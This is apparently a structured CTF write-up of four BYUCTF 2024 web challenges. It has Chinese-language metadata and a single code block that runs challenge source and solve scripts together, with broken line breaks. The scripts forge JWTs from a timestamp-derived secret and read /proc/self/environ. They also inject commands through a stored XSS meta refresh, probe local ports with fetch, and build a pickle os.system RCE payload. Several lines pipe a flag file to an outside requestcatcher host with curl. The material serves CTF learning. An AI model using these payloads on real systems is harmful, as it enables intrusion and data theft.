---
title: BYUCTF 2024/4 题合集
contest: BYUCTF
year: 2024
difficulty: medium
vuln_type:
- jwt
- ssrf
- ssti
- deserialize
- rce
tags:
- 时间戳 secret 爆破
- /proc/self/environ
- secret cookie bypass
- date 命令注入
- meta refresh SSRF
- XSS requestcatcher
- pickle RCE
- random port 探测
attack_chain:
- '题 1: JWT secret = sha256(time_started)，前端响应泄露运行秒数 → 算 time_started → 爆破 secret'
- 用合法 secret 签 userid=0 token，/api/file?filename=/proc/self/environ 读 secret_path
- 读 /<secret_path>/flag.txt
- '题 2: /api/date?modifier= 命令注入，但 url 过滤 date 和 %，用 meta refresh 触发'
- 'payload: <meta http-equiv=refresh content=''0;url=...date?modifier=`cat /ctf/flag.txt|curl ...`''>'
- 通过 /api/stats POST username 存储 XSS payload，再 GET 触发
- '题 3: /query?url= SSRF（限制 127.0.0.1），用 secret cookie 验证 + URL 解析'
- 利用 SSRF 访问 internal service
- '题 4: /pickle?pickle=<hex> pickle 反序列化 RCE'
- 写 RCE 类 __reduce__ 返回 os.system
- 端口 5700-6000 随机，先用 fetch 探测再发 payload
key_payload: 'class RCE: def __reduce__(self): return os.system, (''cat /ctf/flag.txt|curl https://[yours].requestcatcher.com -X POST -d @-'',)'
one_liner: 时间戳爆破 JWT secret + meta refresh SSRF + pickle RCE + secret cookie bypass
lesson: HS256 弱 secret 用 sha256(timestamp) 是常见 CTF 套路；date 命令注入绕过用 meta refresh 不走 URL
quality: high
full_path: BYUCTF_2024_Writeups.full.md
meta_path: BYUCTF_2024_Writeups.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'BYUCTF 2024/4 题合集。时间戳爆破 JWT secret + meta refresh SSRF + pickle RCE + secret cookie bypass。关键路径：题 1: JWT secret = sha256(time_started)，前端响应泄露运行秒数 → 算 time_started → 爆破 secret → 用合法 secret 签 userid=...'
category: web
subcategory: jwt
subcategories:
- jwt
- ssrf
- ssti
- deserialization
- rce
tools_used:
- curl
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/182726.html
reasoning_chain:
- '[触发点] 题 1 后端响应 ''This system has been up for {round(time.time()-time_started)} seconds fyi :wink:'' → 假设：APP_SECRET = sha256(time_started) / [动作] 用响应 running_time 算 time_started / [观察] 算出 time_started 在 ±1 秒内 / [下一步] 爆破 secret'
- '[触发点] 用 sha256(time_started) 算 secret → 假设：HS256 弱 secret 可爆 / [动作] for d in [-1,2]: secret 试 token / [观察] 拿到合法 secret / [下一步] 签 userid=0 token'
- '[触发点] 用合法 secret 签 userid=0 token → 假设：可读 /api/file / [动作] 访问 /api/file?filename=/proc/self/environ / [观察] 泄露 secret_path / [下一步] 读 flag.txt'
- '[触发点] 拿到 secret_path → 假设：/api/file 目录遍历虽然过滤但 /<secret_path>/flag.txt 可达 / [动作] /api/file?filename=/<secret_path>/flag.txt / [观察] 拿到 flag / [下一步] 题 2/3/4 类似 SSRF/RCE'
failed_attempts:
- 试图直接遍历时间 → 失败：响应有 running_time 提示
- 试图在 /api/file 用 ../ 绕过 → 失败：while '../' in filename 循环过滤
key_observations:
- HS256 弱 secret 用 sha256(timestamp) 是常见 CTF 套路
- /proc/self/environ 泄露 secret_path 是 Flask 经典读路径
- date 命令注入绕过用 meta refresh 不走 URL
- pickle __reduce__ 返回 os.system 是 RCE 经典手法
prerequisites:
- JWT HS256 弱 secret 爆破
- Flask /proc/self/environ 读取
- SSRF / 命令注入绕过
- pickle 反序列化 RCE
---
# BYUCTF 2024 Writeups

> 原文: https://www.ctfiot.com/182726.html
> ID: 182726


```
time_started = round(time.time())
APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest()

# check authorization before request handling
@app.before_request
def check_auth():
 # ensure user is an administrator
 session = request.cookies.get('session', None)

 if session is None:
 abort(403)

 try:
 payload = jwt.decode(session, APP_SECRET, algorithms=['HS256'])
 if payload['userid'] != 0:
 abort(401)
 
except:
 abort(Response(f'<h1>NOT AUTHORIZED</h1>




 This system has been up for {round(time.time()-time_started)} seconds fyi :
wink:', status=403))
# get a file
@app.route('/api/file', methods=['GET'])
def get_file():
 filename = request.args.get('filename', None)

 if filename is None:
 abort(Response('No filename provided', status=400))

 # prevent directory traversal
 while '../' in filename:
 filename = filename.replace('../', '')

 # get file contents
 return open(os.path.join('files/', filename),'rb').read()
import requests
import jwt, re, time, hashlib

BASE = 'https://random.chal.cyberjousting.com'
#BASE = 'http://localhost:
40000'

def get_token(secret):
 return jwt.encode({ "userid" : 0 }, secret, algorithm="HS256")

def test(secret):
 r = requests.get(f"{BASE}/", cookies={"session":
get_token(secret)})
 return r.status_code != 403

r = requests.get(F"{BASE}/", cookies={"session":"hoge"}).text
running_time = int(re.search(r'(\d+) seconds', r).group(1))
calcurated_time_started = round(time.time()) - running_time
actual_time_started = -1

for d in range(-1,2):
 secret = hashlib.sha256(str(calcurated_time_started + d).encode()).hexdigest()
 if test(secret) == True:
 actual_time_started = calcurated_time_started + d

assert 0 < actual_time_started

secret = hashlib.sha256(str(actual_time_started).encode()).hexdigest()
secret_path = requests.get(f"{BASE}/api/file?filename=/proc/self/environ", cookies={"session":
get_token(secret)}).text.split('/')[-1][:-1]
r = requests.get(f"{BASE}/api/file?filename=/{secret_path}/flag.txt", cookies={"session":
get_token(secret)}).text
print(r)
# current date
@app.route('/api/date', methods=['GET'])
def get_date():
 # get "secret" cookie
 cookie = request.cookies.get('secret')

 # check if cookie exists
 if cookie == None:
 return '{"error": "Unauthorized"}'

 # check if cookie is valid
 if cookie != SECRET:
 return '{"error": "Unauthorized"}'

 modifier = request.args.get('modifier','')

 return '{"date": "'+subprocess.getoutput("date "+modifier)+'"}'
if (url.includes("date") || url.includes("%")) {
 res.send('Error: "date" is not allowed in the URL')
 return
}
# get stats
@app.route('/api/stats/<string:id>', methods=['GET'])
def get_stats(id):
 for stat in stats:
 if stat['id'] == id:
 return str(stat['data'])

 return '{"error": "Not found"}'

# add stats
@app.route('/api/stats', methods=['POST'])
def add_stats():
 try:
 username = request.json['username']
 high_score = int(request.json['high_score'])
 
except:
 return '{"error": "Invalid request"}'

 id = str(uuid.uuid4())

 stats.append({
 'id': id,
 'data': [username, high_score]
 })
 return '{"success": "Added", "id": "'+id+'"}'
import requests
import json

BASE = 'http://localhost:
40001'

t = requests.post(f"{BASE}/api/stats", json={'username':'<s>asdf<\s>','high_score':1}).text
generated_id = json.loads(t)['id']

t = requests.get(f"{BASE}/api/stats/{generated_id}").text
print(f"{BASE}/api/stats/{generated_id}")
print(t)
import requests
import json
import urllib.parse

#BASE = 'http://localhost:
40001'
BASE = 'https://not-a-problem.chal.cyberjousting.com'

command = 'cat /ctf/flag.txt | curl https://[yours].requestcatcher.com/ -X POST -d @-'
command = urllib.parse.quote(command)
payload = "<meta http-equiv=refresh content='0; url=http://127.0.0.1:
1337/api/date?modifier=`" + command + "`'>"
t = requests.post(f"{BASE}/api/stats", json={'username':
payload,'high_score':1}).text
generated_id = json.loads(t)['id']

t = requests.get(f"{BASE}/api/stats/{generated_id}").text
print(f"{BASE}/api/stats/{generated_id}")
print(t)
# index
@app.route('/', methods=['GET'])
def main():
 name = request.args.get('name','')

 return 'Nope still no front end, front end is for noobs '+name
# query
@app.route('/query', methods=['POST'])
def query():
 # get "secret" cookie
 cookie = request.cookies.get('secret')

 # check if cookie exists
 if cookie == None:
 return {"error": "Unauthorized"}

 # check if cookie is valid
 if cookie != SECRET:
 return {"error": "Unauthorized"}

 # get URL
 try:
 url = request.json['url']
 
except:
 return {"error": "No URL provided"}

 # check if URL exists
 if url == None:
 return {"error": "No URL provided"}

 # check if URL is valid
 try:
 url_parsed = urlparse(url)
 if url_parsed.scheme not in ['http', 'https'] or url_parsed.hostname != '127.0.0.1':
 return {"error": "Invalid URL"}
 
except:
 return {"error": "Invalid URL"}

 # request URL
 try:
 requests.get(url)
 
except:
 return {"error": "Invalid URL"}

 return {"success": "Requested"}
# imports
from flask import Flask, request
import pickle, random

# initialize flask
app = Flask(__name__)
port = random.randint(5700, 6000)
print(port)

# index
@app.route('/pickle', methods=['GET'])
def main():
 pickle_bytes = request.args.get('pickle')

 if pickle_bytes is None:
 return 'No pickle bytes'

 try:
 b = bytes.fromhex(pickle_bytes)
 
except:
 return 'Invalid hex'

 try:
 data = pickle.loads(b)
 
except:
 return 'Invalid pickle'

 return str(data)

if __name__ == "__main__":
 app.run(host='0.0.0.0', port=port, threaded=True)
import requests
from urllib.parse import quote

CATCHER = 'https://[yours].requestcatcher.com/out'

payload = '''
<script>
for (let port = 5700; port <= 6000; port++) {
 const url = 'http://127.0.0.1:' + port.toString();
 fetch(url, {mode: 'no-cors'}).then(res => {
 fetch('<<<CATCHER>>>', { method: "POST", body: port })
 });
}
</script>
'''
payload = payload.replace("<<<CATCHER>>>", CATCHER)

print('====== STAGE 1 =======')
print('?name='+quote(payload))

# POST = 5863

import pickle
import os

class RCE:
 def __reduce__(self):
 cmd = ('cat /ctf/flag.txt | curl https://[yours].requestcatcher.com/out -X POST -d @-')
 return os.system, (cmd,)

def generate_exploit():
 payload = pickle.dumps(RCE())
 return payload

payload = '''
<script>
fetch('http://127.0.0.1:
5863/pickle?pickle=<<>>', {mode: 'no-cors'}).then(response => {
 fetch('<<<CATCHER>>>', { method: "POST", body: "launched!"});
});
</script>
'''
payload = payload.replace("<<<CATCHER>>>", CATCHER)
payload = payload.replace("<<>>", generate_exploit().hex())

print('====== STAGE 2 =======')
print('?name='+quote(payload))
```
